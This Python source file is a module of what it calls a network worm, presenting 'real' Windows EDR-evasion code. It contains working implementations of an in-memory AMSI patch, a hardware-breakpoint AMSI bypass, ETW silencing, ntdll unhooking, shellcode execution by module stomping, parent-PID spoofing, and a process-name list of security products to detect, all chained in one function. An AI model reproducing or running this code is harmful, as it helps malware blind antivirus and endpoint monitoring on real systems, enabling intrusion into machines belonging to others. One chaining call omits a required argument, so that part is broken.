"""
Wormy ML Network Worm v3.0 - EDR Bypass Module (REAL implementations)
"""

import ctypes
import os
import platform
import struct
import sys
from typing import Dict, List, Optional, Tuple

import psutil

sys.path.append(os.path.dirname(os.path.dirname(os.path.abspath(__file__))))
from utils.logger import logger

PAGE_EXECUTE_READWRITE = 0x40


class EDRBypass:
    """
    Real EDR bypass — all stubs replaced with functional ctypes code.
    Techniques: AMSI patch, AMSI HW-BP, ETW disable, DLL unhook,
                Module stomping, PPID spoofing, EDR detection.
    """

    def __init__(self):
        self.os_type = platform.system()
        self.is_admin = self._check_admin()
        self.edr_detected = []
        self.bypass_techniques = []

    def _check_admin(self) -> bool:
        try:
            if self.os_type == "Windows":
                return ctypes.windll.shell32.IsUserAnAdmin() != 0
            return os.geteuid() == 0
        except Exception:
            return False

    # ─── AMSI patch (memory write) ────────────────────────────────────────────

    def bypass_amsi(self) -> bool:
        """Patch AmsiScanBuffer: B8 01 00 00 00 C3 (mov eax,1; ret)"""
        if self.os_type != "Windows":
            return False
        logger.info("AMSI bypass — memory patch")
        try:
            k32 = ctypes.WinDLL("kernel32", use_last_error=True)
            amsi = ctypes.WinDLL("amsi.dll")
            fn = k32.GetProcAddress(amsi._handle, b"AmsiScanBuffer")
            if not fn:
                return False

            patch = b"\xb8\x01\x00\x00\x00\xc3"
            old_prot = ctypes.c_ulong(0)
            k32.VirtualProtect(fn, len(patch), PAGE_EXECUTE_READWRITE, ctypes.byref(old_prot))
            buf = (ctypes.c_char * len(patch)).from_buffer_copy(patch)
            k32.RtlMoveMemory(fn, buf, len(patch))
            k32.VirtualProtect(fn, len(patch), old_prot, ctypes.byref(old_prot))

            logger.success("AMSI patched (mov eax,1; ret)")
            self.bypass_techniques.append("AMSI_Patch")
            return True
        except Exception as e:
            logger.error(f"AMSI patch failed: {e}")
            return False

    # ─── AMSI via hardware breakpoint ────────────────────────────────────────

    def bypass_amsi_hardware_breakpoint(self) -> bool:
        """
        Hardware execution breakpoint on AmsiScanBuffer via DR0/DR7.
        VEH catches EXCEPTION_SINGLE_STEP, sets RAX=1, advances RIP.
        No memory write — avoids patch-detection scanners.
        """
        if self.os_type != "Windows":
            return False
        logger.info("AMSI bypass — hardware breakpoint VEH")
        try:
            k32 = ctypes.WinDLL("kernel32", use_last_error=True)
            amsi = ctypes.WinDLL("amsi.dll")
            fn = k32.GetProcAddress(amsi._handle, b"AmsiScanBuffer")
            if not fn:
                return False

            EXCEPTION_CONTINUE_EXECUTION = 0xFFFFFFFF
            EXCEPTION_SINGLE_STEP = 0x80000004
            CONTEXT_DEBUG_REGISTERS = 0x00010010

            amsi_addr = fn  # capture for closure

            @ctypes.WINFUNCTYPE(ctypes.c_long, ctypes.c_void_p)
            def veh_handler(exception_pointers):
                try:
                    ep = ctypes.cast(exception_pointers, ctypes.POINTER(ctypes.c_void_p))
                    exc_code = ctypes.cast(ep[0], ctypes.POINTER(ctypes.c_ulong))[0]
                    if exc_code == EXCEPTION_SINGLE_STEP:
                        # ctx is the CONTEXT struct pointed by ep[1]
                        # Rax is at a fixed offset (0x78) in x64 CONTEXT
                        rax_ptr = ctypes.cast(ep[1] + 0x78, ctypes.POINTER(ctypes.c_ulong64))
                        rip_ptr = ctypes.cast(ep[1] + 0xF8, ctypes.POINTER(ctypes.c_ulong64))
                        if rip_ptr[0] == amsi_addr:
                            rax_ptr[0] = 1  # AMSI_RESULT_CLEAN
                            rip_ptr[0] += 3  # skip mov r10,rcx (3 bytes)
                            return EXCEPTION_CONTINUE_EXECUTION
                except Exception:
                    pass
                return 0  # EXCEPTION_CONTINUE_SEARCH

            k32.AddVectoredExceptionHandler(1, veh_handler)

            # Enable DR0 hardware breakpoint on the current thread
            thread = k32.GetCurrentThread()
            # Get/set context via a thin CONTEXT-like buffer (DR regs at fixed offsets)
            ctx_buf = (ctypes.c_byte * 1232)()  # sizeof(CONTEXT) on x64
            ctx_flags_ptr = ctypes.cast(ctx_buf, ctypes.POINTER(ctypes.c_ulong))
            ctx_flags_ptr[0] = CONTEXT_DEBUG_REGISTERS
            k32.GetThreadContext(thread, ctx_buf)

            dr0_ptr = ctypes.cast(ctypes.addressof(ctx_buf) + 8, ctypes.POINTER(ctypes.c_ulong64))
            dr7_ptr = ctypes.cast(ctypes.addressof(ctx_buf) + 48, ctypes.POINTER(ctypes.c_ulong64))
            dr0_ptr[0] = fn
            dr7_ptr[0] = (dr7_ptr[0] & ~0xF) | 0x1  # L0=1 (local exact, execute)
            k32.SetThreadContext(thread, ctx_buf)

            logger.success("AMSI hardware breakpoint installed (DR0)")
            self.bypass_techniques.append("AMSI_HW_Breakpoint")
            return True
        except Exception as e:
            logger.error(f"AMSI HW-BP failed: {e}")
            return False

    # ─── ETW disable ─────────────────────────────────────────────────────────

    def disable_etw(self) -> bool:
        """Patch EtwEventWrite prologue with 0xC3 (ret) to kill all ETW events."""
        if self.os_type != "Windows":
            return False
        logger.info("ETW disable — patch EtwEventWrite")
        try:
            k32 = ctypes.WinDLL("kernel32", use_last_error=True)
            ntdll = ctypes.WinDLL("ntdll.dll")
            fn = k32.GetProcAddress(ntdll._handle, b"EtwEventWrite")
            if not fn:
                return False

            old_prot = ctypes.c_ulong(0)
            k32.VirtualProtect(fn, 1, PAGE_EXECUTE_READWRITE, ctypes.byref(old_prot))
            buf = (ctypes.c_char * 1).from_buffer_copy(b"\xc3")
            k32.RtlMoveMemory(fn, buf, 1)
            k32.VirtualProtect(fn, 1, old_prot, ctypes.byref(old_prot))

            logger.success("ETW silenced (EtwEventWrite → ret)")
            self.bypass_techniques.append("ETW_Disabled")
            return True
        except Exception as e:
            logger.error(f"ETW disable failed: {e}")
            return False

    # ─── DLL unhooking ───────────────────────────────────────────────────────

    def unhook_dlls(self) -> bool:
        """
        Read fresh ntdll.dll from disk, find .text section,
        overwrite the loaded (hooked) .text to remove EDR inline hooks.
        """
        if self.os_type != "Windows":
            return False
        logger.info("DLL unhooking — restoring ntdll .text")
        try:
            k32 = ctypes.WinDLL("kernel32", use_last_error=True)
            ntdll_dll = ctypes.WinDLL("ntdll.dll")
            ntdll_base = ntdll_dll._handle

            with open(r"C:\Windows\System32\ntdll.dll", "rb") as f:
                fresh = f.read()

            rva, size = self._find_pe_section(fresh, b".text")
            if not rva:
                return False

            fresh_text = fresh[rva : rva + size]
            target_addr = ntdll_base + rva
            old_prot = ctypes.c_ulong(0)

            k32.VirtualProtect(target_addr, size, PAGE_EXECUTE_READWRITE, ctypes.byref(old_prot))
            buf = (ctypes.c_char * size).from_buffer_copy(fresh_text)
            k32.RtlMoveMemory(target_addr, buf, size)
            k32.VirtualProtect(target_addr, size, old_prot, ctypes.byref(old_prot))

            logger.success(f"ntdll .text restored ({size} bytes, rva=0x{rva:X})")
            self.bypass_techniques.append("DLL_Unhooking")
            return True
        except Exception as e:
            logger.error(f"DLL unhooking failed: {e}")
            return False

    def _find_pe_section(self, pe: bytes, name: bytes) -> Tuple[int, int]:
        """Return (rva, raw_size) of named section, or (0, 0)."""
        try:
            if pe[:2] != b"MZ":
                return 0, 0
            e_lfanew = struct.unpack_from("<I", pe, 0x3C)[0]
            if pe[e_lfanew : e_lfanew + 4] != b"PE\x00\x00":
                return 0, 0
            num_sect = struct.unpack_from("<H", pe, e_lfanew + 6)[0]
            size_opt = struct.unpack_from("<H", pe, e_lfanew + 20)[0]
            sect_offset = e_lfanew + 24 + size_opt
            for i in range(num_sect):
                base = sect_offset + i * 40
                sname = pe[base : base + 8].rstrip(b"\x00")
                vsize = struct.unpack_from("<I", pe, base + 8)[0]
                rva = struct.unpack_from("<I", pe, base + 12)[0]
                rsize = struct.unpack_from("<I", pe, base + 16)[0]
                if sname == name:
                    return rva, min(vsize, rsize)
        except Exception:
            pass
        return 0, 0

    # ─── Module stomping ─────────────────────────────────────────────────────

    def module_stomping(self, shellcode: bytes, target_dll: str = "xpsprint.dll") -> bool:
        """
        Load a rarely-used DLL, overwrite its .text section with shellcode,
        and execute from there. Memory appears as a backed module region.
        """
        if self.os_type != "Windows":
            return False
        logger.info(f"Module stomping — {target_dll}")
        try:
            k32 = ctypes.WinDLL("kernel32", use_last_error=True)
            dll_h = k32.LoadLibraryA(target_dll.encode())
            if not dll_h:
                return False

            path_buf = ctypes.create_string_buffer(512)
            k32.GetModuleFileNameA(dll_h, path_buf, 512)
            with open(path_buf.value.decode(errors="replace"), "rb") as f:
                pe = f.read()

            rva, size = self._find_pe_section(pe, b".text")
            if not rva or size < len(shellcode):
                return False

            target = dll_h + rva
            old_prot = ctypes.c_ulong(0)
            k32.VirtualProtect(
                target, len(shellcode), PAGE_EXECUTE_READWRITE, ctypes.byref(old_prot)
            )
            buf = (ctypes.c_char * len(shellcode)).from_buffer_copy(shellcode)
            k32.RtlMoveMemory(target, buf, len(shellcode))
            k32.VirtualProtect(
                target, len(shellcode), 0x20, ctypes.byref(old_prot)  # PAGE_EXECUTE_READ
            )

            th = k32.CreateThread(None, 0, target, None, 0, None)
            if th:
                k32.WaitForSingleObject(th, 0xFFFFFFFF)
                logger.success(f"Module stomping executed from {target_dll}+0x{rva:X}")
                self.bypass_techniques.append("Module_Stomping")
                return True
            return False
        except Exception as e:
            logger.error(f"Module stomping failed: {e}")
            return False

    # ─── PPID spoofing ───────────────────────────────────────────────────────

    def ppid_spoofing(self, cmd: str = "cmd.exe", target_parent: str = "explorer.exe") -> bool:
        """
        Launch cmd with spoofed parent PID using PROC_THREAD_ATTRIBUTE_PARENT_PROCESS.
        """
        if self.os_type != "Windows":
            return False
        logger.info(f"PPID spoofing: {cmd} as child of {target_parent}")
        try:
            k32 = ctypes.WinDLL("kernel32", use_last_error=True)

            parent_pid = next(
                (
                    p.info["pid"]
                    for p in psutil.process_iter(["name", "pid"])
                    if p.info["name"].lower() == target_parent.lower()
                ),
                None,
            )
            if not parent_pid:
                return False

            parent_h = k32.OpenProcess(0x1F0FFF, False, parent_pid)
            if not parent_h:
                return False

            attr_size = ctypes.c_size_t(0)
            k32.InitializeProcThreadAttributeList(None, 1, 0, ctypes.byref(attr_size))
            attr_list = (ctypes.c_byte * attr_size.value)()
            k32.InitializeProcThreadAttributeList(attr_list, 1, 0, ctypes.byref(attr_size))

            parent_handle = ctypes.c_void_p(parent_h)
            k32.UpdateProcThreadAttribute(
                attr_list,
                0,
                0x00020000,
                ctypes.byref(parent_handle),
                ctypes.sizeof(parent_handle),
                None,
                None,
            )

            si_buf = (ctypes.c_byte * 112)()  # STARTUPINFOEXA size
            ctypes.cast(si_buf, ctypes.POINTER(ctypes.c_ulong))[0] = 112
            # lpAttributeList at offset 104
            ctypes.cast(ctypes.addressof(si_buf) + 104, ctypes.POINTER(ctypes.c_void_p))[0] = (
                ctypes.addressof(attr_list)
            )

            pi_buf = (ctypes.c_byte * 24)()
            ok = k32.CreateProcessA(
                None, cmd.encode(), None, None, False, 0x00080000, None, None, si_buf, pi_buf
            )
            k32.CloseHandle(parent_h)

            if ok:
                pid = struct.unpack_from("<I", pi_buf, 8)[0]
                logger.success(f"Spawned {cmd} (PID {pid}) as child of {target_parent}")
                self.bypass_techniques.append("PPID_Spoofing")
                return True
            return False
        except Exception as e:
            logger.error(f"PPID spoofing failed: {e}")
            return False

    # ─── EDR detection ───────────────────────────────────────────────────────

    def detect_edr(self) -> List[str]:
        logger.info("Detecting EDR/AV products...")
        edr_map = {
            "crowdstrike": ["csagent", "csfalcon"],
            "sentinelone": ["sentinelagent"],
            "carbon_black": ["carbonblack", "cbdefense"],
            "cortex_xdr": ["cytray", "cyveraservice"],
            "defender": ["msmpeng", "mssense"],
            "sophos": ["savservice"],
            "mcafee": ["mcshield"],
            "kaspersky": ["avp"],
            "bitdefender": ["bdagent"],
            "eset": ["ekrn", "egui"],
        }
        detected = []
        for proc in psutil.process_iter(["name"]):
            try:
                n = proc.info["name"].lower()
                for edr, indicators in edr_map.items():
                    if any(i in n for i in indicators) and edr not in detected:
                        detected.append(edr)
                        logger.warning(f"EDR detected: {edr}")
            except Exception:
                pass
        self.edr_detected = detected
        return detected

    def apply_all_bypasses(self) -> Dict[str, bool]:
        self.detect_edr()
        return {
            "amsi_patch": self.bypass_amsi(),
            "amsi_hw_breakpoint": self.bypass_amsi_hardware_breakpoint(),
            "etw_disable": self.disable_etw(),
            "dll_unhooking": self.unhook_dlls(),
            "ppid_spoofing": self.ppid_spoofing(),
            "module_stomping": self.module_stomping(),
        }

    def get_statistics(self) -> Dict:
        return {
            "edr_detected": self.edr_detected,
            "techniques_applied": self.bypass_techniques,
            "is_admin": self.is_admin,
        }
